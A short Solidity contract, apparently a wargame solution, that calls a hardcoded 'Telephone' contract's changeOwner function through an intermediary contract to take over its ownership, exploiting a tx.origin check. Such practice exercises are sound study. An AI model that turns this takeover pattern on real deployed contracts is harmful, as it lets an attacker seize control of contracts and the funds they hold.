// SPDX-License-Identifier: MIT
import "./telephone.sol";

pragma solidity ^0.8.0;

contract callTelephone {
    address telephoneAddress = 0x2E78367Aa9AF40908FA8BC979Ce6AeF31BC3920b;

    constructor(){
    }

    function callChangeOwner(address newOwner) public returns (bool){
        Telephone telephone = Telephone(telephoneAddress);
        telephone.changeOwner(newOwner);
        return telephone.owner() == newOwner;
    }



}